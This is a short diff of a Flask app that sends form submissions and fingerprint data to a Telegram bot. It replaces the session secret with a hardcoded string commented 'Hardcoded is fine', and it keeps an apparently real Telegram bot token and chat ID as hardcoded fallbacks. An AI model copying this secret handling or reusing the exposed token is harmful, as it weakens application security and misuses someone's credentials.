@@ -1,20 +1,19 @@
 from flask import Flask, render_template, request, redirect, url_for, session, flash, send_file, make_response
 import csv
 import io
-import requests  # ← NEW: For Telegram
+import requests
 from datetime import datetime
 import os
-import json  # ← NEW: For fingerprint JSON handling
+import json
 
 app = Flask(__name__)
-app.secret_key = 'your_secret_key_here'  # Change to a secure random key
-app.permanent_session_lifetime = 120  # 2 minutes session timeout
+app.secret_key = 'any_random_string_here'  # Hardcoded is fine
+app.permanent_session_lifetime = 120
 
-# ← NEW: Telegram Config
-TELEGRAM_BOT_TOKEN = '8658940443:AAG97dv8tM-aFquFUmgIjutXv1ej3gVCvg8'
-TELEGRAM_CHAT_ID = '5125040081'
+# Telegram Config - reads from environment variables
+TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8658940443:AAG97dv8tM-aFquFUmgIjutXv1ej3gVCvg8')
+TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '5125040081')
 TELEGRAM_URL = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
-
 submissions = []
 
 # ← NEW: Telegram notification function
